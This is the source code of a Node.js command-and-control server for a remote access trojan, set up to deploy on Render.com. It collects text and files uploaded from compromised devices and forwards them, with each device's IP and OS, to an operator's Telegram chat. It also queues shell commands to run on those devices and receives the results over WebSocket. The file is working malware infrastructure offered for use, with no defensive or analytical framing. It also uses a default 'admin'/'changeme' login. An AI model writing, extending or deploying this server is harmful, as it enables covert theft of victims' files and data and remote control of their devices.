// =============================================================
// COMPLETE C2 SERVER WITH ALL FEATURES (Render.com compatible)
// =============================================================
require('dotenv').config();
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const http = require('http');
const basicAuth = require('express-basic-auth');
const helmet = require('helmet');
const cors = require('cors');
const WebSocket = require('ws');
const TelegramBot = require('./utils/telegram');
const Database = require('./utils/database');
const Logger = require('./utils/logger');

// =============================================================
// CONFIGURATION
// =============================================================
const app = express();

// Render injects PORT automatically (e.g. 10000) — never hardcode 443
const PORT = process.env.PORT || 3000;

// Render free tier has an ephemeral filesystem.
// For persistence, attach a Render Disk and set PERSISTENT_DIR env var.
const BASE_DIR = process.env.PERSISTENT_DIR || __dirname;
const UPLOAD_DIR = path.join(BASE_DIR, 'uploads');
const LOG_DIR = path.join(BASE_DIR, 'logs');
const PUBLIC_DIR = path.join(__dirname, 'public');
const COMMANDS_DIR = path.join(BASE_DIR, 'commands');

// Initialize utilities
const telegram = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, process.env.TELEGRAM_CHAT_ID);
// DB also lives on the persistent disk if available
const db = new Database(process.env.DB_PATH || path.join(BASE_DIR, 'database.sqlite'));
const logger = new Logger(LOG_DIR);

// Create directories if they don't exist
[UPLOAD_DIR, LOG_DIR, PUBLIC_DIR, COMMANDS_DIR, path.join(LOG_DIR, 'devices')].forEach(dir => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// Initialize database
db.init().then(() => {
  logger.log('Database initialized successfully');
}).catch(err => {
  logger.error('Failed to initialize database: ' + err.message);
});

// =============================================================
// MIDDLEWARE
// =============================================================
app.set('trust proxy', 1); // Render sits behind a proxy — required for req.ip
app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(PUBLIC_DIR));
app.use(basicAuth({
  users: { [process.env.ADMIN_USERNAME || 'admin']: process.env.ADMIN_PASSWORD || 'changeme' },
  challenge: true,
  realm: 'RAT C2 Server'
}));

// File upload configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(UPLOAD_DIR, req.body.uuid || 'unknown');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    const name = path.basename(file.originalname, ext);
    cb(null, `${name}_${Date.now()}${ext}`);
  }
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB
});

// =============================================================
// HELPER FUNCTIONS
// =============================================================
function getDeviceInfo(req) {
  return {
    uuid: req.body.uuid || req.query.uuid || 'unknown',
    ip: req.headers['x-forwarded-for']?.split(',')[0].trim() || req.ip || 'unknown',
    userAgent: req.headers['user-agent'],
    os: getOS(req.headers['user-agent']),
    timestamp: new Date().toISOString()
  };
}

function getOS(userAgent) {
  if (!userAgent) return 'Unknown';
  if (/Android/i.test(userAgent)) return 'Android';
  if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
  if (/Windows/i.test(userAgent)) return 'Windows';
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
  if (/Linux/i.test(userAgent)) return 'Linux';
  return 'Unknown';
}

function getFileType(filename) {
  const ext = path.extname(filename).toLowerCase();
  if (['.jpg', '.jpeg', '.png', '.gif'].includes(ext)) return 'image';
  if (['.mp4', '.webm', '.mov'].includes(ext)) return 'video';
  if (['.mp3', '.wav', '.ogg'].includes(ext)) return 'audio';
  if (['.txt', '.log', '.json'].includes(ext)) return 'text';
  return 'other';
}

// =============================================================
// API ENDPOINTS
// =============================================================

// Receive text data
app.post('/api/uploadText', async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req);
    const { label, data } = req.body;

    const deviceId = await db.addDevice(deviceInfo);
    await db.updateDeviceLastSeen(deviceInfo.uuid);
    await db.addData(deviceId, label, data);

    logger.log(`Received data from ${deviceInfo.uuid}: ${label}`);
    logger.deviceLog(deviceInfo.uuid, `Received data: ${label}`);

    await telegram.sendFullData(deviceInfo, label, data);

    res.status(200).json({ status: 'success' });
  } catch (error) {
    logger.error(`Error in /api/uploadText: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Receive files
app.post('/api/upload', upload.single('file'), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req);
    const file = req.file;

    if (!file) {
      return res.status(400).json({ status: 'error', message: 'No file uploaded' });
    }

    const deviceId = await db.addDevice(deviceInfo);
    await db.updateDeviceLastSeen(deviceInfo.uuid);

    const fileType = getFileType(file.originalname);
    await db.addFile(deviceId, file.originalname, file.path, file.size, fileType);

    logger.log(`Received file from ${deviceInfo.uuid}: ${file.originalname}`);
    logger.deviceLog(deviceInfo.uuid, `Received file: ${file.originalname}`);

    let message = `<b>📁 NEW FILE FROM DEVICE</b>\n\n`;
    message += `<b>🆔 UUID:</b> <code>${deviceInfo.uuid}</code>\n`;
    message += `<b>🌐 IP:</b> <code>${deviceInfo.ip}</code>\n`;
    message += `<b>💻 OS:</b> <code>${deviceInfo.os}</code>\n`;
    message += `<b>📄 File:</b> <code>${file.originalname}</code>\n`;
    message += `<b>📏 Size:</b> <code>${(file.size / 1024 / 1024).toFixed(2)} MB</code>`;

    await telegram.sendMessage(message);

    if (fileType === 'image') {
      await telegram.sendPhoto(file.path, `Image from ${deviceInfo.uuid}`);
    } else if (fileType === 'video') {
      await telegram.sendVideo(file.path, `Video from ${deviceInfo.uuid}`);
    } else if (fileType === 'audio') {
      await telegram.sendAudio(file.path, `Audio from ${deviceInfo.uuid}`);
    } else {
      await telegram.sendDocument(file.path, `File from ${deviceInfo.uuid}`);
    }

    res.status(200).json({ status: 'success' });
  } catch (error) {
    logger.error(`Error in /api/upload: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Get all devices
app.get('/api/devices', async (req, res) => {
  try {
    const devices = await db.getDevices();
    res.json(devices);
  } catch (error) {
    logger.error(`Error in /api/devices: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Get device by UUID
app.get('/api/devices/:uuid', async (req, res) => {
  try {
    const device = await db.getDeviceByUUID(req.params.uuid);
    if (!device) {
      return res.status(404).json({ status: 'error', message: 'Device not found' });
    }

    const data = await db.getDeviceData(device.id);
    const files = await db.getDeviceFiles(device.id);

    res.json({ device, data, files });
  } catch (error) {
    logger.error(`Error in /api/devices/:uuid: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Get device files
app.get('/api/devices/:uuid/files', async (req, res) => {
  try {
    const device = await db.getDeviceByUUID(req.params.uuid);
    if (!device) {
      return res.status(404).json({ status: 'error', message: 'Device not found' });
    }

    const files = await db.getDeviceFiles(device.id);
    res.json(files);
  } catch (error) {
    logger.error(`Error in /api/devices/:uuid/files: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Get device logs
app.get('/api/devices/:uuid/logs', async (req, res) => {
  try {
    const logFile = path.join(LOG_DIR, 'devices', `${req.params.uuid}.log`);
    if (!fs.existsSync(logFile)) {
      return res.status(404).json({ status: 'error', message: 'Log file not found' });
    }

    const logContent = fs.readFileSync(logFile, 'utf8');
    res.send(`<pre>${logContent}</pre>`);
  } catch (error) {
    logger.error(`Error in /api/devices/:uuid/logs: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Get all commands
app.get('/api/commands', async (req, res) => {
  try {
    const devices = await db.getDevices();
    const commands = await Promise.all(devices.map(async device => {
      const deviceCommands = await db.getPendingCommands(device.id);
      return deviceCommands.map(cmd => ({
        ...cmd,
        device_uuid: device.uuid
      }));
    })).then(results => results.flat());

    res.json(commands);
  } catch (error) {
    logger.error(`Error in /api/commands: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Send command to device
app.post('/api/commands', async (req, res) => {
  try {
    const { device_uuid, command, type } = req.body;

    if (!device_uuid || !command || !type) {
      return res.status(400).json({ status: 'error', message: 'Missing required fields' });
    }

    const device = await db.getDeviceByUUID(device_uuid);
    if (!device) {
      return res.status(404).json({ status: 'error', message: 'Device not found' });
    }

    const commandId = await db.addCommand(device.id, command);

    logger.log(`Command sent to ${device_uuid}: ${command}`);
    logger.deviceLog(device_uuid, `Command sent: ${command}`);

    let message = `<b>📡 COMMAND SENT TO DEVICE</b>\n\n`;
    message += `<b>🆔 UUID:</b> <code>${device_uuid}</code>\n`;
    message += `<b>💻 OS:</b> <code>${device.os}</code>\n`;
    message += `<b>📝 Command:</b> <code>${command}</code>\n`;
    message += `<b>🏷️ Type:</b> <code>${type}</code>`;

    await telegram.sendMessage(message);

    res.json({ status: 'success', commandId });
  } catch (error) {
    logger.error(`Error in /api/commands: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Get server logs
app.get('/api/logs', (req, res) => {
  try {
    const logFiles = fs.readdirSync(LOG_DIR).filter(file => file.endsWith('.log'));
    let logs = [];

    logFiles.forEach(file => {
      const filePath = path.join(LOG_DIR, file);
      const content = fs.readFileSync(filePath, 'utf8');
      const lines = content.split('\n').filter(line => line.trim());

      lines.forEach(line => {
        const match = line.match(/^\[(.*?)\] \[(.*?)\] (.*)$/);
        if (match) {
          logs.push({
            timestamp: match[1],
            level: match[2].toLowerCase(),
            message: match[3]
          });
        }
      });
    });

    logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    res.json(logs);
  } catch (error) {
    logger.error(`Error in /api/logs: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Update command status
app.post('/api/commands/:id/status', async (req, res) => {
  try {
    const { status, result } = req.body;
    const commandId = req.params.id;

    await db.updateCommandStatus(commandId, status, result);

    logger.log(`Command ${commandId} status updated to ${status}`);

    res.json({ status: 'success' });
  } catch (error) {
    logger.error(`Error in /api/commands/:id/status: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Update settings
app.post('/api/settings', async (req, res) => {
  try {
    const { telegram_token, telegram_chat, admin_username, admin_password } = req.body;

    logger.log('Settings update requested');

    let message = `<b>⚙️ SERVER SETTINGS UPDATED</b>\n\n`;
    message += `<b>Telegram Bot:</b> <code>${telegram_token ? 'Updated' : 'Not changed'}</code>\n`;
    message += `<b>Admin Username:</b> <code>${admin_username ? 'Updated' : 'Not changed'}</code>`;

    await telegram.sendMessage(message);

    res.json({ status: 'success', message: 'Settings update requested' });
  } catch (error) {
    logger.error(`Error in /api/settings: ${error.message}`);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// =============================================================
// WEB INTERFACE ROUTES
// =============================================================

// Dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

// Device details
app.get('/devices/:uuid', async (req, res) => {
  try {
    const device = await db.getDeviceByUUID(req.params.uuid);
    if (!device) {
      return res.status(404).send('Device not found');
    }

    const data = await db.getDeviceData(device.id);
    const files = await db.getDeviceFiles(device.id);

    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Device: ${device.uuid}</title>
      <link rel="stylesheet" href="/style.css">
    </head>
    <body>
      <div class="container">
        <h1>Device: ${device.uuid}</h1>
        <div class="device-info">
          <p><b>IP Address:</b> ${device.ip}</p>
          <p><b>OS:</b> ${device.os}</p>
          <p><b>First Seen:</b> ${new Date(device.first_seen).toLocaleString()}</p>
          <p><b>Last Seen:</b> ${new Date(device.last_seen).toLocaleString()}</p>
          <p><b>Status:</b> <span class="${device.status === 'active' ? 'status-active' : 'status-inactive'}">${device.status}</span></p>
        </div>

        <div class="tabs">
          <button class="tab-button active" onclick="openDeviceTab('data', this)">Data</button>
          <button class="tab-button" onclick="openDeviceTab('files', this)">Files</button>
          <button class="tab-button" onclick="openDeviceTab('commands', this)">Commands</button>
        </div>

        <div id="data" class="tab-content">
          <h2>Data</h2>
          <table>
            <thead>
              <tr>
                <th>Type</th>
                <th>Content</th>
                <th>Time</th>
              </tr>
            </thead>
            <tbody>
              ${data.map(item => `
                <tr>
                  <td>${item.type}</td>
                  <td><pre>${JSON.stringify(JSON.parse(item.content), null, 2)}</pre></td>
                  <td>${new Date(item.timestamp).toLocaleString()}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>

        <div id="files" class="tab-content" style="display: none;">
          <h2>Files</h2>
          <table>
            <thead>
              <tr>
                <th>Filename</th>
                <th>Type</th>
                <th>Size</th>
                <th>Time</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              ${files.map(file => `
                <tr>
                  <td>${file.filename}</td>
                  <td>${file.type}</td>
                  <td>${(file.size / 1024 / 1024).toFixed(2)} MB</td>
                  <td>${new Date(file.timestamp).toLocaleString()}</td>
                  <td>
                    <a href="/download/${device.uuid}/${encodeURIComponent(file.path.replace(UPLOAD_DIR + '/', ''))}" class="view-btn">Download</a>
                  </td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>

        <div id="commands" class="tab-content" style="display: none;">
          <h2>Commands</h2>
          <div class="command-form">
            <input type="text" id="new-command" placeholder="Enter command">
            <button onclick="sendDeviceCommand('${device.uuid}')">Send Command</button>
          </div>
          <table>
            <thead>
              <tr>
                <th>Command</th>
                <th>Status</th>
                <th>Result</th>
                <th>Time</th>
              </tr>
            </thead>
            <tbody id="device-commands-list">
              <!-- Commands will be loaded here -->
            </tbody>
          </table>
        </div>
      </div>

      <script>
        function openDeviceTab(tabName, btn) {
          const tabContents = document.querySelectorAll('.tab-content');
          tabContents.forEach(content => {
            content.style.display = 'none';
          });

          const tabButtons = document.querySelectorAll('.tab-button');
          tabButtons.forEach(button => {
            button.classList.remove('active');
          });

          document.getElementById(tabName).style.display = 'block';
          btn.classList.add('active');

          if (tabName === 'commands') {
            loadDeviceCommands('${device.uuid}');
          }
        }

        async function loadDeviceCommands(uuid) {
          try {
            const response = await fetch('/api/commands');
            const commands = await response.json();
            const deviceCommands = commands.filter(cmd => cmd.device_uuid === uuid);

            const commandsList = document.getElementById('device-commands-list');
            commandsList.innerHTML = '';

            deviceCommands.forEach(command => {
              const row = document.createElement('tr');

              let statusClass = '';
              if (command.status === 'completed') statusClass = 'status-active';
              if (command.status === 'failed') statusClass = 'status-inactive';

              row.innerHTML = \`
                <td>\${command.command}</td>
                <td><span class="\${statusClass}">\${command.status}</span></td>
                <td>\${command.result ? command.result.substring(0, 50) + '...' : 'N/A'}</td>
                <td>\${new Date(command.timestamp).toLocaleString()}</td>
              \`;

              commandsList.appendChild(row);
            });
          } catch (error) {
            console.error('Error loading commands:', error);
          }
        }

        async function sendDeviceCommand(uuid) {
          const commandInput = document.getElementById('new-command');
          const command = commandInput.value.trim();

          if (!command) {
            alert('Please enter a command');
            return;
          }

          try {
            const response = await fetch('/api/commands', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                device_uuid: uuid,
                command: command,
                type: 'exec'
              })
            });

            if (response.ok) {
              alert('Command sent successfully');
              commandInput.value = '';
              loadDeviceCommands(uuid);
            } else {
              alert('Failed to send command');
            }
          } catch (error) {
            console.error('Error sending command:', error);
            alert('Error sending command');
          }
        }
      </script>
    </body>
    </html>
    `);
  } catch (error) {
    logger.error(`Error in /devices/:uuid: ${error.message}`);
    res.status(500).send('Server error');
  }
});

// Device files
app.get('/files/:uuid', async (req, res) => {
  try {
    const device = await db.getDeviceByUUID(req.params.uuid);
    if (!device) {
      return res.status(404).send('Device not found');
    }

    const files = await db.getDeviceFiles(device.id);

    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Files for ${device.uuid}</title>
      <link rel="stylesheet" href="/style.css">
    </head>
    <body>
      <div class="container">
        <h1>Files for ${device.uuid}</h1>
        <table>
          <thead>
            <tr>
              <th>Filename</th>
              <th>Type</th>
              <th>Size</th>
              <th>Time</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            ${files.map(file => `
              <tr>
                <td>${file.filename}</td>
                <td>${file.type}</td>
                <td>${(file.size / 1024 / 1024).toFixed(2)} MB</td>
                <td>${new Date(file.timestamp).toLocaleString()}</td>
                <td>
                  <a href="/download/${device.uuid}/${encodeURIComponent(file.path.replace(UPLOAD_DIR + '/', ''))}" class="view-btn">Download</a>
                </td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
    </body>
    </html>
    `);
  } catch (error) {
    logger.error(`Error in /files/:uuid: ${error.message}`);
    res.status(500).send('Server error');
  }
});

// Device logs
app.get('/logs/:uuid', async (req, res) => {
  try {
    const logFile = path.join(LOG_DIR, 'devices', `${req.params.uuid}.log`);
    if (!fs.existsSync(logFile)) {
      return res.status(404).send('Log file not found');
    }

    const logContent = fs.readFileSync(logFile, 'utf8');
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Logs for ${req.params.uuid}</title>
      <link rel="stylesheet" href="/style.css">
    </head>
    <body>
      <div class="container">
        <h1>Logs for ${req.params.uuid}</h1>
        <div class="log-container">
          <pre>${logContent}</pre>
        </div>
      </div>
    </body>
    </html>
    `);
  } catch (error) {
    logger.error(`Error in /logs/:uuid: ${error.message}`);
    res.status(500).send('Server error');
  }
});

// Download file (safe path handling)
app.get('/download/:uuid/:filename', async (req, res) => {
  try {
    const safePath = path.join(UPLOAD_DIR, req.params.uuid, path.basename(req.params.filename));
    if (!safePath.startsWith(UPLOAD_DIR) || !fs.existsSync(safePath)) {
      return res.status(404).send('File not found');
    }

    res.download(safePath);
  } catch (error) {
    logger.error(`Error in /download/:uuid/:filename: ${error.message}`);
    res.status(500).send('Server error');
  }
});

// =============================================================
// WEBSOCKET SERVER (HTTP — Render terminates TLS itself)
// =============================================================
const server = http.createServer(app);

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
  logger.log('New WebSocket connection');

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      logger.log(`WebSocket message received: ${data.type}`);

      if (data.type === 'device_connected') {
        logger.log(`Device connected: ${data.uuid}`);
        telegram.sendMessage(`🔌 <b>Device Connected</b>\nUUID: <code>${data.uuid}</code>\nOS: <code>${data.os}</code>`);
      } else if (data.type === 'command_result') {
        logger.log(`Command result from ${data.uuid}: ${data.result}`);
        db.updateCommandStatus(data.commandId, 'completed', data.result);
        telegram.sendMessage(`✅ <b>Command Result</b>\nUUID: <code>${data.uuid}</code>\nResult: <code>${String(data.result).substring(0, 1000)}</code>`);
      }
    } catch (error) {
      logger.error(`Error processing WebSocket message: ${error.message}`);
    }
  });

  ws.on('close', () => {
    logger.log('WebSocket connection closed');
  });
});

// Health check for Render
app.get('/healthz', (req, res) => res.status(200).send('OK'));

// =============================================================
// START SERVER
// =============================================================
server.listen(PORT, '0.0.0.0', () => {
  logger.log(`🚀 C2 Server running on port ${PORT}`);
  telegram.sendMessage(`🚀 <b>C2 Server Started</b>\nPort: <code>${PORT}</code>\nDomain: <code>${process.env.DOMAIN || 'Not configured'}</code>`);
});
